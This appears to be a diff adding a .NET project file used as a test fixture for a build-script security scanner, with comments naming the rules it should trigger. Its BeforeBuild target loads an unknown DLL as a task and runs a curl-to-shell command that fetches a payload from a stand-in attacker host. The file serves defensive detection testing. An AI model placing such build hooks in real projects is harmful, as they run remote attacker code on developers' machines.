@@ -1,0 +1,13 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <TargetFramework>net8.0</TargetFramework>
+  </PropertyGroup>
+  <!-- Custom UsingTask pointing at an unknown/unpinned DLL — Scarno
+       emits TS-SI-017 because arbitrary code executes at build time. -->
+  <UsingTask TaskName="HackTask" AssemblyFile="C:\tmp\unknown.dll" />
+  <Target Name="BeforeBuild">
+    <HackTask />
+    <!-- The curl | sh pattern below also trips TS-SI-016. -->
+    <Exec Command="curl https://evil.example.com/payload.sh | sh" />
+  </Target>
+</Project>
